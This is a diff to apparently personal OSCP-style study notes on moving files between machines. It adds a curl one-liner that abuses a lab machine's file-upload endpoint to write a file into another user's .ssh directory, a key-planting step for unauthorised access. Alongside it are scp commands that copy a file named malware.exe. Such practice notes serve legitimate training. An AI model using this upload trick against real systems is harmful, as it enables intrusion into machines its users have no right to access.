@@ -29,6 +29,9 @@ Transfer File From Windows To Linux via ssh:
         2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
         or Download putty's scp - pscp.exe and run preferrably in C:\ root directory :         
         c:\pscp c:\Users\name\Documents\file.txt shaleph@192.168.45.X:/home/shalep/OSCP/path/newname.txt
+
+    Upload file with curl:
+        curl -L -i -X POST -H "Conetent-Type: multipart/form-data" -F file="@/home/kali/CTF/Offsec/Amaterasu/text.pub.txt" -F filename="/home/alfredo/.ssh/id_rsa.pub" http://192.168.179.249:33414/file-upload
  
         
 file metadata analyzer:
